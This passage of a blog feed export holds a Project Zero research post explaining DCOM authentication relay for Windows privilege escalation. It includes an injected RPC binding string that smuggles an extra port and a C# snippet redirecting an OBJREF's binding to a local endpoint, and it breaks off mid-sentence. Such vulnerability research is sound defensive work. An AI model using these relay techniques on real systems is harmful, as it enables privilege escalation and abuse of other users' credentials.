    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/12/this-shouldnt-have-happened.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/7868790017880077590" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/7868790017880077590" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/12/this-shouldnt-have-happened.html" title="This shouldn't have happened: A vulnerability postmortem" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-5634534606665421566</id>
    <published>2021-10-20T09:38:00.000-07:00</published>
    <updated>2021-10-21T09:00:14.541-07:00</updated>
    <title type="text">Windows Exploitation Tricks: Relaying DCOM Authentication</title>
    <content type="html">&lt;style type="text/css"&gt;.lst-kix_21eii7u3d36d-6&gt;li:before{content:"" counter(lst-ctn-kix_21eii7u3d36d-6,decimal) ". "}.lst-kix_4h5ag0d3tyrp-4&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-4}ol.lst-kix_21eii7u3d36d-8{list-style-type:none}ol.lst-kix_21eii7u3d36d-7{list-style-type:none}ol.lst-kix_21eii7u3d36d-0.start{counter-reset:lst-ctn-kix_21eii7u3d36d-0 0}ol.lst-kix_21eii7u3d36d-6{list-style-type:none}ol.lst-kix_21eii7u3d36d-5{list-style-type:none}.lst-kix_21eii7u3d36d-3&gt;li:before{content:"(" counter(lst-ctn-kix_21eii7u3d36d-3,decimal) ") "}ol.lst-kix_21eii7u3d36d-4{list-style-type:none}.lst-kix_21eii7u3d36d-7&gt;li:before{content:"" counter(lst-ctn-kix_21eii7u3d36d-7,lower-latin) ". "}ol.lst-kix_21eii7u3d36d-3{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-6.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-6 0}.lst-kix_21eii7u3d36d-2&gt;li:before{content:"" counter(lst-ctn-kix_21eii7u3d36d-2,lower-roman) ") "}ol.lst-kix_21eii7u3d36d-2{list-style-type:none}ol.lst-kix_21eii7u3d36d-1{list-style-type:none}ol.lst-kix_21eii7u3d36d-7.start{counter-reset:lst-ctn-kix_21eii7u3d36d-7 0}ol.lst-kix_21eii7u3d36d-0{list-style-type:none}.lst-kix_21eii7u3d36d-0&gt;li:before{content:"" counter(lst-ctn-kix_21eii7u3d36d-0,decimal) ") "}ol.lst-kix_21eii7u3d36d-3.start{counter-reset:lst-ctn-kix_21eii7u3d36d-3 0}.lst-kix_21eii7u3d36d-8&gt;li:before{content:"" counter(lst-ctn-kix_21eii7u3d36d-8,lower-roman) ". "}.lst-kix_21eii7u3d36d-1&gt;li:before{content:"" counter(lst-ctn-kix_21eii7u3d36d-1,lower-latin) ") "}.lst-kix_21eii7u3d36d-3&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-3}.lst-kix_4h5ag0d3tyrp-5&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-5}ol.lst-kix_21eii7u3d36d-6.start{counter-reset:lst-ctn-kix_21eii7u3d36d-6 0}ol.lst-kix_4h5ag0d3tyrp-3.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-3 0}ol.lst-kix_4h5ag0d3tyrp-7.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-7 0}.lst-kix_21eii7u3d36d-2&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-2}.lst-kix_21eii7u3d36d-5&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-5}.lst-kix_21eii7u3d36d-8&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-8}ol.lst-kix_4h5ag0d3tyrp-0.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-0 0}ol.lst-kix_21eii7u3d36d-8.start{counter-reset:lst-ctn-kix_21eii7u3d36d-8 0}ol.lst-kix_4h5ag0d3tyrp-4.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-4 0}ol.lst-kix_21eii7u3d36d-2.start{counter-reset:lst-ctn-kix_21eii7u3d36d-2 0}.lst-kix_4h5ag0d3tyrp-0&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-0}.lst-kix_21eii7u3d36d-4&gt;li:before{content:"(" counter(lst-ctn-kix_21eii7u3d36d-4,lower-latin) ") "}.lst-kix_4h5ag0d3tyrp-6&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-6}.lst-kix_21eii7u3d36d-5&gt;li:before{content:"(" counter(lst-ctn-kix_21eii7u3d36d-5,lower-roman) ") "}.lst-kix_4h5ag0d3tyrp-3&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-3}ol.lst-kix_4h5ag0d3tyrp-6{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-7{list-style-type:none}ol.lst-kix_21eii7u3d36d-5.start{counter-reset:lst-ctn-kix_21eii7u3d36d-5 0}ol.lst-kix_4h5ag0d3tyrp-4{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-1.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-1 0}ol.lst-kix_4h5ag0d3tyrp-5{list-style-type:none}.lst-kix_4h5ag0d3tyrp-7&gt;li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-7,lower-latin) ". "}.lst-kix_21eii7u3d36d-6&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-6}ol.lst-kix_4h5ag0d3tyrp-8.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-8 0}.lst-kix_4h5ag0d3tyrp-1&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-1}ol.lst-kix_4h5ag0d3tyrp-8{list-style-type:none}.lst-kix_4h5ag0d3tyrp-4&gt;li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-4,lower-latin) ". "}.lst-kix_4h5ag0d3tyrp-8&gt;li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-8,lower-roman) ". "}.lst-kix_21eii7u3d36d-0&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-0}.lst-kix_4h5ag0d3tyrp-3&gt;li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-3,decimal) ". "}ol.lst-kix_4h5ag0d3tyrp-2{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-3{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-0{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-1{list-style-type:none}.lst-kix_4h5ag0d3tyrp-2&gt;li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-2,lower-roman) ". "}.lst-kix_4h5ag0d3tyrp-7&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-7}ol.lst-kix_21eii7u3d36d-1.start{counter-reset:lst-ctn-kix_21eii7u3d36d-1 0}.lst-kix_4h5ag0d3tyrp-5&gt;li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-5,lower-roman) ". "}.lst-kix_4h5ag0d3tyrp-8&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-8}.lst-kix_4h5ag0d3tyrp-6&gt;li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-6,decimal) ". "}ol.lst-kix_21eii7u3d36d-4.start{counter-reset:lst-ctn-kix_21eii7u3d36d-4 0}.lst-kix_4h5ag0d3tyrp-2&gt;li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-2}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ol.lst-kix_4h5ag0d3tyrp-5.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-5 0}.lst-kix_21eii7u3d36d-4&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-4}.lst-kix_21eii7u3d36d-7&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-7}.lst-kix_4h5ag0d3tyrp-1&gt;li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-1,lower-latin) ". "}.lst-kix_21eii7u3d36d-1&gt;li{counter-increment:lst-ctn-kix_21eii7u3d36d-1}.lst-kix_4h5ag0d3tyrp-0&gt;li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-0,decimal) ". "}ol.lst-kix_4h5ag0d3tyrp-2.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-2 0}ol{margin:0;padding:0}table td,table th{padding:0}.c31{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c9{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c23{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c6{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:"Courier New";font-style:normal}.c5{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c10{background-color:#ffffff;font-size:10pt;font-family:"Courier New";color:#8000ff;font-weight:400}.c3{background-color:#ffffff;font-size:10pt;font-family:"Courier New";color:#000080;font-weight:700}.c20{border-spacing:0;border-collapse:collapse;margin-right:auto}.c16{background-color:#ffffff;font-size:10pt;font-family:"Courier New";font-weight:700}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c11{background-color:#ffffff;font-size:10pt;font-family:"Courier New";font-weight:400}.c25{color:#000000;font-weight:400;font-size:16pt;font-family:"Arial"}.c22{color:#000000;font-weight:400;font-size:11pt;font-family:"Courier New"}.c2{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c8{font-size:10pt;font-family:"Courier New";color:#a82d00;font-weight:400}.c7{font-size:10pt;font-family:"Courier New";color:#696969;font-weight:400}.c12{font-size:10pt;font-family:"Courier New";font-weight:400}.c17{text-decoration:none;vertical-align:baseline;font-style:normal}.c29{padding:0;margin:0}.c34{margin-left:36pt;padding-left:0pt}.c35{max-width:468pt;padding:72pt 72pt 72pt 72pt}.c21{color:inherit;text-decoration:inherit}.c14{color:#8b0000}.c13{color:#0000ff}.c19{height:11pt}.c15{color:#800000}.c4{font-style:italic}.c18{color:#800080}.c24{color:#006161}.c33{background-color:#ffffff}.c32{color:#000080}.c27{color:#a31515}.c30{color:#00008b}.c26{height:0pt}.c28{color:#8a2be2}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c33 c35"&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;Posted by James Forshaw, Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;In my &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html"&gt;previous blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;I discussed the possibility of relaying Kerberos authentication from a DCOM connection. I was originally going to provide a more in-depth explanation of how that works, but as it&amp;#39;s quite involved I thought it was worthy of its own blog post. This is primarily a technique to get relay authentication from another user on the same machine and forward that to a network service such as LDAP. You could use this to escalate privileges on a host using a technique similar to a &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#case-study-2-windows-1020162019-lpe"&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;from Shenanigans Labs&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;but removing the requirement for the WebDAV service. Let&amp;#39;s get straight to it.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c23" id="h.5xga9tje7jcd"&gt;&lt;span class="c25 c17"&gt;Background&lt;/span&gt;&lt;/h2&gt; &lt;p class="c5"&gt;&lt;span&gt;The technique to locally relay authentication for DCOM was something I originally reported back in 2015 (&lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=325"&gt;issue 325&lt;/a&gt;&lt;/span&gt;&lt;span&gt;). This issue was fixed as CVE-2015-2370, however the underlying authentication relay using DCOM remained. This was repurposed and expanded upon by various others for local and remote privilege escalation in the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/"&gt;RottenPotato&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;series of exploits, the latest in that line being &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://github.com/antonioCoco/RemotePotato0"&gt;RemotePotato&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is currently unpatched as of October 2021.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;The key feature that the exploit abused is standard COM marshaling. Specifically when a COM object is marshaled so that it can be used by a different process or host, the COM runtime generates an &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31"&gt;OBJREF structure&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, most commonly the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/51312511-36e1-4ab6-993c-523643b11a29"&gt;OBJREF_STANDARD&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;form. This structure contains all the information necessary to establish a connection between a COM client and the original object in the COM server.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;Connecting to the original object from the OBJREF is a two part process:&lt;/span&gt;&lt;/p&gt;&lt;ol class="c29 lst-kix_4h5ag0d3tyrp-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c5 c34 li-bullet-0"&gt;&lt;span&gt;The client extracts the &lt;/span&gt;&lt;span class="c4"&gt;Object Exporter ID (OXID)&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;from the structure and contacts the OXID resolver service specified by the RPC binding information in the OBJREF.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c5 c34 li-bullet-0"&gt;&lt;span class="c9"&gt;The client uses the OXID resolver service to find the RPC binding information of the COM server which hosts the object and establishes a connection to the RPC endpoint to access the object&amp;#39;s interfaces.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;Both of these steps require establishing an MSRPC connection to an endpoint. Commonly this is either locally over ALPC, or remotely via TCP. If a TCP connection is used then the client will also authenticate to the RPC server using NTLM or Kerberos based on the security bindings in the OBJREF.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;The first key insight I had for &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=325"&gt;issue 325&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;is that you can construct an OBJREF which will always establish a connection to the OXID resolver service over TCP, even if the service was on the local machine. To do this you specify the hostname as an IP address and an arbitrary TCP port for the client to connect to. This allows you to listen locally and when the RPC connection is made the authentication can be relayed or repurposed. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;This isn&amp;#39;t yet a privilege escalation, since you need to convince a privileged user to unmarshal the OBJREF. This was the second key insight: you could get a privileged service to unmarshal an arbitrary OBJREF easily using the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-cogetinstancefromistorage"&gt;CoGetInstanceFromIStorage&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;API and activating a privileged COM service. This marshals a COM object, creates the privileged COM server and then unmarshals the object in the server&amp;#39;s security context. This results in an RPC call to the fake OXID resolver authenticated using a privileged user&amp;#39;s credentials. From there the authentication could be relayed to the local system for privilege escalation.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c4"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEgC1LWHaQILinmN2Ri4wwnm_orJGvy_JlW1bSGw-cA58EhUiJ1pjqPVIB631q6rAJ4CfuaxX41dSkuQVzbYfUi3kMTu6Nukm1r6Pctu50MG9D6DbXCR5p7nS3_R2-__ijBFvR4bY6KG8xfM1JRlmmsf9zSfgKjmBWh6PPW6KhGMVwToaS3KIBAQXJ9-qg=s958" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEgC1LWHaQILinmN2Ri4wwnm_orJGvy_JlW1bSGw-cA58EhUiJ1pjqPVIB631q6rAJ4CfuaxX41dSkuQVzbYfUi3kMTu6Nukm1r6Pctu50MG9D6DbXCR5p7nS3_R2-__ijBFvR4bY6KG8xfM1JRlmmsf9zSfgKjmBWh6PPW6KhGMVwToaS3KIBAQXJ9-qg=s958" border="0" alt="Diagram of an DCOM authentication relay attack from issue 325" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;Being able to redirect the OXID resolver RPC connection locally to a different TCP port was not by design and Microsoft eventually fixed this in Windows 10 1809/Server 2019. The underlying issue prior to Windows 10 1809 was the string containing the host returned as part of the OBJREF was directly concatenated into an &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/rpc/string-binding"&gt;RPC string binding&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;. Normally the RPC string binding should have been in the form of:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.e77594769c6122f6cc07295f638fefdcc6db828e"&gt;&lt;/a&gt;&lt;a id="t.0"&gt;&lt;/a&gt;&lt;table class="c20"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c31" colspan="1" rowspan="1"&gt; &lt;p class="c5"&gt;&lt;span class="c6"&gt;ncacn_ip_tcp:ADDRESS[135]&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;Where &lt;/span&gt;&lt;span class="c4"&gt;ncacn_ip_tcp&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the protocol sequence for RPC over TCP, &lt;/span&gt;&lt;span class="c4"&gt;ADDRESS &lt;/span&gt;&lt;span&gt;is the target address which would come from the string binding, and &lt;/span&gt;&lt;span class="c4"&gt;[135]&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;is the well-known TCP port for the OXID resolver appended by RPCSS. However, as the ADDRESS value is inserted manually into the binding then the OBJREF could specify its own port, resulting in the string binding:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.97aa81be1b3e01eee48e6be87e60b7c9ec811e04"&gt;&lt;/a&gt;&lt;a id="t.1"&gt;&lt;/a&gt;&lt;table class="c20"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c31" colspan="1" rowspan="1"&gt; &lt;p class="c5"&gt;&lt;span class="c6"&gt;ncacn_ip_tcp:ADDRESS[9999][135]&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;The RPC runtime would just pick the first port in the binding string to connect to, in this case 9999, and would ignore the second port 135. This behavior was fixed by calling the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcstringbindingcomposew"&gt;RpcStringBindingCompose&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;API which will correctly escape the additional port number which ensures it&amp;#39;s ignored when making the RPC connection.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;This is where the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/"&gt;RemotePotato exploit&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, developed by &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://twitter.com/splinter_code"&gt;Antonio Cocomazzi&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://twitter.com/decoder_it"&gt;Andrea Pierini&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, comes into the picture. While it was no longer possible to redirect the OXID resolving to a local TCP server, you could redirect the initial connection to an external server. A call is made to the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/65292e10-ef0c-43ee-bce7-788e271cc794"&gt;IObjectExporter::ResolveOxid2&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;method which can return an arbitrary RPC binding string for a fake COM object. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;Unlike the OXID resolver binding string, the one for the COM object is allowed to contain an arbitrary TCP port. By returning a binding string for the original host on an arbitrary TCP port, the second part of the connection process can be relayed rather than the first. The relayed authentication can then be sent to a domain server, such as LDAP or SMB, as long as they don&amp;#39;t enforce signing.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c4"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEjYCyswqZ8qWypofWlN8MGh7DQOpizVk2RQV1gQXpTC3msgP-lU9dyhzWoPa202o4QintKybxlLjUXvj9XMlkfLLJzaJngWnh4l9igGacZf167_RkD-bZSQ_XfPyGtaGPfWsx5_xToI9YQs2bb6iI4I4NJG_LQYlLBGOeMl9l5vS8S6vqNXiShh1qqIiA=s1302" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEjYCyswqZ8qWypofWlN8MGh7DQOpizVk2RQV1gQXpTC3msgP-lU9dyhzWoPa202o4QintKybxlLjUXvj9XMlkfLLJzaJngWnh4l9igGacZf167_RkD-bZSQ_XfPyGtaGPfWsx5_xToI9YQs2bb6iI4I4NJG_LQYlLBGOeMl9l5vS8S6vqNXiShh1qqIiA=s1302" border="0" alt="Diagram of an DCOM authentication relay attack from Remote Potato" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;This exploit has the clear disadvantage of requiring an external machine to act as the target of the initial OXID resolving. While investigating the Kerberos authentication relay attacks for DCOM, could I find a way to do everything on the same machine?&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c23" id="h.ifb7mhiinb48"&gt;&lt;span class="c17 c25"&gt;Remote &amp;#10140; Local Potato&lt;/span&gt;&lt;/h2&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;If we&amp;#39;re relaying the authentication for the second RPC connection, could we get the local OXID resolver to do the work for us and resolve to a local COM server on a randomly selected port? One of my goals is to write the least amount of code, which is why we&amp;#39;ll do everything in C# and .NET.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.78af739dc60f8ded5f3815bfc652d7621558437e"&gt;&lt;/a&gt;&lt;a id="t.2"&gt;&lt;/a&gt;&lt;table class="c20"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c31" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c12 c13"&gt;byte&lt;/span&gt;&lt;span class="c6"&gt;[] ba = GetMarshalledObject(new object());&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12 c13"&gt;var&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;std = COMObjRefStandard.FromArray(ba);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;Console.WriteLine(&lt;/span&gt;&lt;span class="c12 c27"&gt;&amp;quot;IPID: {0}&amp;quot;&lt;/span&gt;&lt;span class="c6"&gt;, std.Ipid);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;Console.WriteLine(&lt;/span&gt;&lt;span class="c12 c27"&gt;&amp;quot;OXID: {0:X08}&amp;quot;&lt;/span&gt;&lt;span class="c6"&gt;, std.Oxid);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;Console.WriteLine(&lt;/span&gt;&lt;span class="c12 c27"&gt;&amp;quot;OID : {0:X08}&amp;quot;&lt;/span&gt;&lt;span class="c6"&gt;, std.Oid);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;std.StringBindings.Clear();&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;std.StringBindings.Add(RpcTowerId.Tcp, &lt;/span&gt;&lt;span class="c12 c27"&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;span class="c6"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;Console.WriteLine(&lt;/span&gt;&lt;span class="c12 c27"&gt;$&amp;quot;objref:&lt;/span&gt;&lt;span class="c12"&gt;{0}&lt;/span&gt;&lt;span class="c12 c27"&gt;:&amp;quot;&lt;/span&gt;&lt;span class="c12"&gt;, Convert.ToBase64String(std.ToArray());&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;This code creates a basic .NET object and COM marshals it to a 